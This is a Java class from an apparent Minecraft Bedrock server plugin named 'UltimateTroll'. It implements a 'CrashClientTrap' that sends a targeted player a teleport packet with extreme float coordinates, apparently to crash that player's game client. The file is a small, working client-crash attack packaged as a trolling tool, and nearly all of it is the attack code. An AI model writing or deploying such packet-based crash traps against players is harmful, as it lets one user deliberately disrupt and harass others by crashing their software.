package josscoder.ultimatetroll.trap.base;

import cn.nukkit.Player;
import cn.nukkit.network.protocol.MovePlayerPacket;
import josscoder.ultimatetroll.trap.Trap;

public class CrashClientTrap extends Trap {

    @Override
    public void init() {

    }

    @Override
    public String getImage() {
        return "textures/blocks/wool_colored_lime.png";
    }

    @Override
    public void onExecute(Player target) {
        MovePlayerPacket packet = new MovePlayerPacket();
        packet.x = Float.MAX_VALUE;
        packet.y = -Float.MAX_VALUE;
        packet.z = -Float.MAX_VALUE;
        packet.mode = MovePlayerPacket.MODE_TELEPORT;
        packet.eid = target.getId();
        target.dataPacket(packet);
    }

    @Override
    public void close() {

    }
}

